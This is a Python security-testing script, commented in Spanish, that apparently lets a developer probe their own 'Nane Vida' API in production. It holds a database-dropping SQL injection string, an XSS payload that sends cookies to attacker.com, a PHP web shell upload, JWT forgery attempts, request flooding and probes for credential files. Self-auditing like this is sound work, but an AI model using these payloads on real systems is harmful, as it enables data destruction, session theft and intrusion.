#!/usr/bin/env python3
"""
NANE VIDA - Security Penetration Testing Suite
Level: Advanced Hacking (God Mode)
================================================================
Este script prueba exhaustivamente la seguridad de la API.

VECTORES DE ATAQUE PROBADOS:
1. SQL Injection (SQLi)
2. NoSQL Injection
3. Cross-Site Scripting (XSS)
4. Cross-Site Request Forgery (CSRF)
5. Authentication Bypass
6. Authorization Bypass (IDOR)
7. JWT Token Tampering
8. Rate Limiting / DoS
9. File Upload Vulnerabilities
10. Path Traversal
11. Command Injection
12. LDAP Injection
13. XML External Entity (XXE)
14. Server-Side Request Forgery (SSRF)
15. HTTP Header Injection
16. Mass Assignment
17. Insecure Direct Object Reference (IDOR)
18. Business Logic Flaws
19. API Enumeration
20. Information Disclosure
"""

import requests
import json
import time
import base64
import hashlib
import hmac
from typing import Dict, List, Tuple
from datetime import datetime, timedelta
import jwt
import sys

# ===================================================================
# CONFIGURACIÓN
# ===================================================================
API_BASE = "https://nane-vida-mvp-production.up.railway.app/api"
# API_BASE = "http://127.0.0.1:8000/api"  # Para pruebas locales

# Colores para output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# ===================================================================
# UTILIDADES
# ===================================================================
def print_header(text: str):
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}{text.center(70)}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'='*70}{Colors.END}\n")

def print_test(test_name: str):
    print(f"{Colors.BOLD}{Colors.BLUE}[TEST] {test_name}{Colors.END}")

def print_vuln(message: str):
    print(f"{Colors.BOLD}{Colors.RED}[🚨 VULNERABLE] {message}{Colors.END}")

def print_safe(message: str):
    print(f"{Colors.BOLD}{Colors.GREEN}[✓ SEGURO] {message}{Colors.END}")

def print_info(message: str):
    print(f"{Colors.YELLOW}[ℹ] {message}{Colors.END}")

def print_warning(message: str):
    print(f"{Colors.MAGENTA}[⚠] {message}{Colors.END}")

# ===================================================================
# CLASE PRINCIPAL DE TESTING
# ===================================================================
class SecurityTester:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()
        self.token = None
        self.refresh_token = None
        self.test_user = {
            "username": f"hacker_test_{int(time.time())}",
            "email": f"hacker{int(time.time())}@test.com",
            "password": "Hacker123!@#",
            "password2": "Hacker123!@#",
            "first_name": "Test",
            "last_name": "Hacker"
        }
        self.vulnerabilities = []
        self.safe_checks = []

    # ===================================================================
    # 1. SETUP - Crear usuario de prueba
    # ===================================================================
    def setup_test_user(self):
        print_header("FASE 0: CONFIGURACIÓN DE USUARIO DE PRUEBA")
        try:
            # Registrar usuario
            resp = self.session.post(f"{self.base_url}/register/", json=self.test_user)
            if resp.status_code == 201:
                print_safe("Usuario de prueba creado exitosamente")
            elif resp.status_code == 400:
                print_info("Usuario ya existe, intentando login...")
            else:
                print_warning(f"Respuesta inesperada al crear usuario: {resp.status_code}")
            
            # Login
            resp = self.session.post(f"{self.base_url}/token/", json={
                "username": self.test_user["username"],
                "password": self.test_user["password"]
            })
            
            if resp.status_code == 200:
                data = resp.json()
                self.token = data.get("access")
                self.refresh_token = data.get("refresh")
                print_safe(f"Login exitoso. Token obtenido.")
                return True
            else:
                print_vuln(f"No se pudo hacer login: {resp.status_code}")
                return False
                
        except Exception as e:
            print_vuln(f"Error en setup: {e}")
            return False

    # ===================================================================
    # 2. SQL INJECTION TESTS
    # ===================================================================
    def test_sql_injection(self):
        print_header("FASE 1: PRUEBAS DE SQL INJECTION")
        
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin'--",
            "admin' #",
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE entries;--",
            "' WAITFOR DELAY '00:00:05'--",
            "1' ORDER BY 10--",
            "1' UNION ALL SELECT NULL,NULL,NULL--"
        ]
        
        endpoints = [
            ("/token/", "username"),
            ("/entries/", "title"),
            ("/entries/", "content"),
        ]
        
        for endpoint, field in endpoints:
            for payload in payloads:
                print_test(f"Probando SQLi en {endpoint} campo '{field}': {payload[:30]}...")
                
                try:
                    if endpoint == "/token/":
                        data = {"username": payload, "password": "test"}
                    else:
                        data = {field: payload, "content": "test"}
                        headers = {"Authorization": f"Bearer {self.token}"}
                    
                    resp = self.session.post(
                        f"{self.base_url}{endpoint}",
                        json=data,
                        headers=headers if endpoint != "/token/" else {}
                    )
                    
                    # Buscar indicadores de SQLi exitoso
                    response_text = resp.text.lower()
                    sql_errors = ["sql", "mysql", "postgresql", "syntax error", "database", "query"]
                    
                    if any(error in response_text for error in sql_errors):
                        self.vulnerabilities.append(f"SQLi posible en {endpoint} campo {field}")
                        print_vuln(f"Posible SQLi detectado - Error SQL en respuesta")
                    elif resp.status_code == 500:
                        self.vulnerabilities.append(f"SQLi causa error 500 en {endpoint}")
                        print_vuln(f"Payload causa error 500 - posible SQLi")
                    else:
                        self.safe_checks.append(f"SQLi bloqueado en {endpoint}")
                        
                except Exception as e:
                    print_warning(f"Error en prueba: {e}")
                    
                time.sleep(0.1)  # Rate limiting friendly
        
        print_safe("Pruebas de SQL Injection completadas")

    # ===================================================================
    # 3. XSS (Cross-Site Scripting) TESTS
    # ===================================================================
    def test_xss(self):
        print_header("FASE 2: PRUEBAS DE XSS (Cross-Site Scripting)")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
            "<body onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//",
            "<script>document.location='http://attacker.com/?c='+document.cookie</script>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<IMG SRC=\"javascript:alert('XSS');\">",
        ]
        
        fields_to_test = ["title", "content", "bio"]
        
        for payload in xss_payloads:
            print_test(f"Probando XSS: {payload[:50]}...")
            
            # Test en entrada de diario
            try:
                data = {
                    "title": payload,
                    "content": payload,
                    "emoji": "😊"
                }
                headers = {"Authorization": f"Bearer {self.token}"}
                
                resp = self.session.post(
                    f"{self.base_url}/entries/",
                    json=data,
                    headers=headers
                )
                
                if resp.status_code == 201:
                    # Verificar si el payload se guarda sin sanitizar
                    entry_id = resp.json().get("id")
                    get_resp = self.session.get(
                        f"{self.base_url}/entries/{entry_id}/",
                        headers=headers
                    )
                    
                    if payload in get_resp.text:
                        self.vulnerabilities.append(f"XSS posible - Payload no sanitizado en entrada {entry_id}")
                        print_vuln(f"Payload XSS almacenado sin sanitizar!")
                    else:
                        self.safe_checks.append("XSS bloqueado en entries")
                        print_safe("Payload XSS sanitizado correctamente")
                        
            except Exception as e:
                print_warning(f"Error en prueba XSS: {e}")
                
            time.sleep(0.1)
        
        print_safe("Pruebas de XSS completadas")

    # ===================================================================
    # 4. AUTHENTICATION BYPASS TESTS
    # ===================================================================
    def test_auth_bypass(self):
        print_header("FASE 3: PRUEBAS DE BYPASS DE AUTENTICACIÓN")
        
        print_test("Intentando acceder a endpoints protegidos sin token...")
        
        protected_endpoints = [
            "/entries/",
            "/profile/",
            "/mood-stats/",
        ]
        
        for endpoint in protected_endpoints:
            try:
                # Sin token
                resp = self.session.get(f"{self.base_url}{endpoint}")
                
                if resp.status_code == 200:
                    self.vulnerabilities.append(f"Acceso sin autenticación a {endpoint}")
                    print_vuln(f"❌ {endpoint} accesible SIN token!")
                elif resp.status_code == 401:
                    self.safe_checks.append(f"Auth requerida en {endpoint}")
                    print_safe(f"✓ {endpoint} requiere autenticación")
                    
            except Exception as e:
                print_warning(f"Error: {e}")
        
        # Test con token inválido
        print_test("Probando con token JWT inválido...")
        fake_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        
        for endpoint in protected_endpoints:
            try:
                headers = {"Authorization": f"Bearer {fake_token}"}
                resp = self.session.get(f"{self.base_url}{endpoint}", headers=headers)
                
                if resp.status_code == 200:
                    self.vulnerabilities.append(f"Token falso aceptado en {endpoint}")
                    print_vuln(f"❌ Token JWT falso aceptado en {endpoint}!")
                else:
                    self.safe_checks.append(f"Token falso rechazado en {endpoint}")
                    print_safe(f"✓ Token falso rechazado en {endpoint}")
                    
            except Exception as e:
                print_warning(f"Error: {e}")

    # ===================================================================
    # 5. IDOR (Insecure Direct Object Reference) TESTS
    # ===================================================================
    def test_idor(self):
        print_header("FASE 4: PRUEBAS DE IDOR (Insecure Direct Object Reference)")
        
        # Crear una entrada
        print_test("Creando entrada de prueba...")
        headers = {"Authorization": f"Bearer {self.token}"}
        
        entry_data = {
            "title": "IDOR Test Entry",
            "content": "Esta es una entrada privada",
            "emoji": "🔒"
        }
        
        resp = self.session.post(
            f"{self.base_url}/entries/",
            json=entry_data,
            headers=headers
        )
        
        if resp.status_code == 201:
            entry_id = resp.json().get("id")
            print_info(f"Entrada creada con ID: {entry_id}")
            
            # Intentar acceder con otro usuario (sin token)
            print_test(f"Intentando acceder a entrada {entry_id} sin autenticación...")
            resp = self.session.get(f"{self.base_url}/entries/{entry_id}/")
            
            if resp.status_code == 200:
                self.vulnerabilities.append(f"IDOR: Entrada {entry_id} accesible sin auth")
                print_vuln(f"❌ IDOR Detectado! Entrada privada accesible")
            elif resp.status_code == 401:
                print_safe("✓ Entrada requiere autenticación")
            
            # Intentar IDs secuenciales (enumeration)
            print_test("Probando enumeración de IDs...")
            for test_id in range(max(1, entry_id - 5), entry_id + 5):
                try:
                    resp = self.session.get(
                        f"{self.base_url}/entries/{test_id}/",
                        headers=headers
                    )
                    if resp.status_code == 200 and test_id != entry_id:
                        print_warning(f"Entrada {test_id} de otro usuario accesible")
                except:
                    pass

    # ===================================================================
    # 6. JWT TOKEN TAMPERING TESTS
    # ===================================================================
    def test_jwt_tampering(self):
        print_header("FASE 5: PRUEBAS DE MANIPULACIÓN DE TOKEN JWT")
        
        if not self.token:
            print_warning("No hay token disponible para probar")
            return
        
        print_test("Analizando token JWT...")
        try:
            # Decodificar sin verificar
            parts = self.token.split('.')
            if len(parts) == 3:
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
                
                print_info(f"Header: {header}")
                print_info(f"Payload keys: {list(payload.keys())}")
                
                # Intentar cambiar el algoritmo a "none"
                print_test("Probando ataque 'none algorithm'...")
                none_header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "none", "typ": "JWT"}).encode()
                ).decode().rstrip('=')
                
                none_payload = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).decode().rstrip('=')
                
                tampered_token = f"{none_header}.{none_payload}."
                
                headers = {"Authorization": f"Bearer {tampered_token}"}
                resp = self.session.get(f"{self.base_url}/entries/", headers=headers)
                
                if resp.status_code == 200:
                    self.vulnerabilities.append("JWT acepta algoritmo 'none'")
                    print_vuln("❌ Token con algoritmo 'none' aceptado!")
                else:
                    self.safe_checks.append("JWT rechaza algoritmo 'none'")
                    print_safe("✓ Algoritmo 'none' rechazado")
                
                # Modificar user_id
                print_test("Probando modificación de user_id...")
                modified_payload = payload.copy()
                if 'user_id' in modified_payload:
                    modified_payload['user_id'] = 999999
                    
                    mod_payload_b64 = base64.urlsafe_b64encode(
                        json.dumps(modified_payload).encode()
                    ).decode().rstrip('=')
                    
                    modified_token = f"{parts[0]}.{mod_payload_b64}.{parts[2]}"
                    
                    headers = {"Authorization": f"Bearer {modified_token}"}
                    resp = self.session.get(f"{self.base_url}/entries/", headers=headers)
                    
                    if resp.status_code == 200:
                        self.vulnerabilities.append("JWT con payload modificado aceptado")
                        print_vuln("❌ Token con user_id modificado aceptado!")
                    else:
                        self.safe_checks.append("JWT con payload modificado rechazado")
                        print_safe("✓ Token con payload modificado rechazado")
                        
        except Exception as e:
            print_warning(f"Error en prueba JWT: {e}")

    # ===================================================================
    # 7. RATE LIMITING / DOS TESTS
    # ===================================================================
    def test_rate_limiting(self):
        print_header("FASE 6: PRUEBAS DE RATE LIMITING / DOS")
        
        print_test("Enviando múltiples requests rápidos al login...")
        
        start_time = time.time()
        success_count = 0
        
        for i in range(50):
            try:
                resp = self.session.post(
                    f"{self.base_url}/token/",
                    json={
                        "username": f"fake_user_{i}",
                        "password": "fake_pass"
                    },
                    timeout=5
                )
                
                if resp.status_code != 429:  # 429 = Too Many Requests
                    success_count += 1
                    
            except requests.exceptions.Timeout:
                print_info("Timeout - posible protección contra DoS")
                break
            except Exception as e:
                pass
        
        elapsed = time.time() - start_time
        
        if success_count >= 45:
            self.vulnerabilities.append("No hay rate limiting en /token/")
            print_vuln(f"❌ {success_count}/50 requests exitosos sin rate limiting!")
        else:
            self.safe_checks.append("Rate limiting implementado")
            print_safe(f"✓ Rate limiting detectado ({success_count}/50 requests)")
        
        print_info(f"Tiempo total: {elapsed:.2f}s")

    # ===================================================================
    # 8. FILE UPLOAD VULNERABILITIES
    # ===================================================================
    def test_file_upload(self):
        print_header("FASE 7: PRUEBAS DE VULNERABILIDADES EN FILE UPLOAD")
        
        if not self.token:
            print_warning("No hay token para probar file upload")
            return
        
        print_test("Probando upload de archivo malicioso...")
        
        malicious_files = [
            # PHP Shell
            ("shell.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            # Executable
            ("malware.exe", b"\x4D\x5A\x90\x00", "application/x-msdownload"),
            # SVG con JavaScript
            ("xss.svg", '<svg onload="alert(1)"/>', "image/svg+xml"),
            # Archivo muy grande (DoS)
            ("huge.jpg", b"x" * (10 * 1024 * 1024), "image/jpeg"),  # 10MB
        ]
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        for filename, content, content_type in malicious_files:
            print_test(f"Intentando subir: {filename}...")
            
            try:
                files = {"avatar": (filename, content, content_type)}
                data = {"bio": "Test bio"}
                
                resp = self.session.put(
                    f"{self.base_url}/profile/",
                    files=files,
                    data=data,
                    headers=headers,
                    timeout=10
                )
                
                if resp.status_code == 200:
                    self.vulnerabilities.append(f"Archivo malicioso aceptado: {filename}")
                    print_vuln(f"❌ Archivo {filename} aceptado!")
                    
                    # Intentar acceder al archivo
                    if 'avatar' in resp.json():
                        avatar_url = resp.json()['avatar']
                        print_info(f"URL del archivo: {avatar_url}")
                elif resp.status_code == 400:
                    self.safe_checks.append(f"Archivo malicioso rechazado: {filename}")
                    print_safe(f"✓ {filename} rechazado correctamente")
                    
            except requests.exceptions.Timeout:
                print_warning(f"Timeout con {filename} - posible protección contra DoS")
            except Exception as e:
                print_warning(f"Error: {e}")

    # ===================================================================
    # 9. INFORMATION DISCLOSURE TESTS
    # ===================================================================
    def test_information_disclosure(self):
        print_header("FASE 8: PRUEBAS DE DIVULGACIÓN DE INFORMACIÓN")
        
        print_test("Buscando endpoints sensibles...")
        
        sensitive_paths = [
            "/.env",
            "/settings.py",
            "/.git/config",
            "/admin/",
            "/.aws/credentials",
            "/config.json",
            "/swagger/",
            "/api-docs/",
            "/debug/",
            "/phpinfo.php",
            "/test/",
            "/__pycache__/",
        ]
        
        for path in sensitive_paths:
            try:
                resp = self.session.get(f"{self.base_url}{path}")
                
                if resp.status_code == 200:
                    self.vulnerabilities.append(f"Endpoint sensible accesible: {path}")
                    print_vuln(f"❌ {path} es accesible!")
                    
            except Exception as e:
                pass
        
        # Verificar headers sensibles
        print_test("Analizando headers HTTP...")
        resp = self.session.get(self.base_url.replace('/api', ''))
        
        sensitive_headers = {
            "Server": "Versión del servidor",
            "X-Powered-By": "Tecnología backend",
            "X-AspNet-Version": "Versión ASP.NET",
        }
        
        for header, description in sensitive_headers.items():
            if header in resp.headers:
                print_warning(f"Header sensible encontrado: {header} = {resp.headers[header]}")
            else:
                print_safe(f"✓ Header {header} no presente")

    # ===================================================================
    # 10. MASS ASSIGNMENT TESTS
    # ===================================================================
    def test_mass_assignment(self):
        print_header("FASE 9: PRUEBAS DE MASS ASSIGNMENT")
        
        print_test("Intentando modificar campos no autorizados...")
        
        if not self.token:
            return
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        # Intentar cambiar is_staff, is_superuser, etc.
        malicious_data = {
            "bio": "Normal bio",
            "is_staff": True,
            "is_superuser": True,
            "is_active": True,
            "user_permissions": ["all"],
            "groups": ["admin"],
        }
        
        try:
            resp = self.session.put(
                f"{self.base_url}/profile/",
                json=malicious_data,
                headers=headers
            )
            
            if resp.status_code == 200:
                data = resp.json()
                
                # Verificar si campos peligrosos fueron aceptados
                dangerous_fields = ["is_staff", "is_superuser", "user_permissions", "groups"]
                accepted = [field for field in dangerous_fields if field in data]
                
                if accepted:
                    self.vulnerabilities.append(f"Mass assignment posible: {accepted}")
                    print_vuln(f"❌ Campos peligrosos aceptados: {accepted}")
                else:
                    self.safe_checks.append("Mass assignment bloqueado")
                    print_safe("✓ Solo campos permitidos aceptados")
                    
        except Exception as e:
            print_warning(f"Error: {e}")

    # ===================================================================
    # 11. BUSINESS LOGIC FLAWS
    # ===================================================================
    def test_business_logic(self):
        print_header("FASE 10: PRUEBAS DE LÓGICA DE NEGOCIO")
        
        if not self.token:
            return
        
        headers = {"Authorization": f"Bearer {self.token}"}
        
        # Test: Crear entrada con fecha futura
        print_test("Intentando crear entrada con timestamp futuro...")
        future_date = (datetime.now() + timedelta(days=365)).isoformat()
        
        data = {
            "title": "Future entry",
            "content": "This is from the future",
            "created_at": future_date,
        }
        
        try:
            resp = self.session.post(
                f"{self.base_url}/entries/",
                json=data,
                headers=headers
            )
            
            if resp.status_code == 201:
                entry = resp.json()
                if "created_at" in entry:
                    print_warning("Fecha de creación puede ser manipulada")
                    
        except Exception as e:
            pass
        
        # Test: Crear muchas entradas rápidamente
        print_test("Creando múltiples entradas rápidamente...")
        for i in range(10):
            try:
                resp = self.session.post(
                    f"{self.base_url}/entries/",
                    json={"title": f"Entry {i}", "content": "spam"},
                    headers=headers,
                    timeout=2
                )
            except:
                break

    # ===================================================================
    # EJECUTAR TODAS LAS PRUEBAS
    # ===================================================================
    def run_all_tests(self):
        print(f"{Colors.BOLD}{Colors.MAGENTA}")
        print("╔══════════════════════════════════════════════════════════════════════╗")
        print("║                                                                      ║")
        print("║              NANE VIDA - SECURITY PENETRATION TEST                  ║")
        print("║                    Advanced Hacking Suite                           ║")
        print("║                                                                      ║")
        print("╚══════════════════════════════════════════════════════════════════════╝")
        print(f"{Colors.END}\n")
        
        print_info(f"Target: {self.base_url}")
        print_info(f"Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        
        # Setup
        if not self.setup_test_user():
            print_vuln("No se pudo crear usuario de prueba. Algunas pruebas fallarán.")
        
        # Ejecutar todas las pruebas
        try:
            self.test_sql_injection()
            self.test_xss()
            self.test_auth_bypass()
            self.test_idor()
            self.test_jwt_tampering()
            self.test_rate_limiting()
            self.test_file_upload()
            self.test_information_disclosure()
            self.test_mass_assignment()
            self.test_business_logic()
        except KeyboardInterrupt:
            print_warning("\n\nPruebas interrumpidas por el usuario")
        
        # Reporte final
        self.print_final_report()

    # ===================================================================
    # REPORTE FINAL
    # ===================================================================
    def print_final_report(self):
        print_header("REPORTE FINAL DE SEGURIDAD")
        
        total_tests = len(self.vulnerabilities) + len(self.safe_checks)
        vuln_count = len(self.vulnerabilities)
        safe_count = len(self.safe_checks)
        
        print(f"\n{Colors.BOLD}Resumen:{Colors.END}")
        print(f"  Total de pruebas: {total_tests}")
        print(f"  {Colors.RED}❌ Vulnerabilidades encontradas: {vuln_count}{Colors.END}")
        print(f"  {Colors.GREEN}✓ Controles de seguridad OK: {safe_count}{Colors.END}")
        
        if vuln_count > 0:
            print(f"\n{Colors.BOLD}{Colors.RED}VULNERABILIDADES CRÍTICAS:{Colors.END}")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"  {i}. {vuln}")
        
        # Score de seguridad
        if total_tests > 0:
            security_score = (safe_count / total_tests) * 100
            
            print(f"\n{Colors.BOLD}SCORE DE SEGURIDAD: ", end="")
            if security_score >= 90:
                print(f"{Colors.GREEN}{security_score:.1f}%{Colors.END} 🛡️ EXCELENTE")
            elif security_score >= 70:
                print(f"{Colors.YELLOW}{security_score:.1f}%{Colors.END} ⚠️  BUENO")
            elif security_score >= 50:
                print(f"{Colors.MAGENTA}{security_score:.1f}%{Colors.END} ⚡ MEJORABLE")
            else:
                print(f"{Colors.RED}{security_score:.1f}%{Colors.END} 🚨 CRÍTICO")
        
        print(f"\n{Colors.BOLD}Fin del reporte - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Colors.END}\n")

# ===================================================================
# MAIN
# ===================================================================
if __name__ == "__main__":
    print(f"{Colors.BOLD}{Colors.YELLOW}")
    print("⚠️  ADVERTENCIA: Este script está diseñado SOLO para pruebas de seguridad autorizadas.")
    print("⚠️  NO usar en sistemas de terceros sin permiso explícito.")
    print(f"{Colors.END}\n")
    
    tester = SecurityTester(API_BASE)
    tester.run_all_tests()
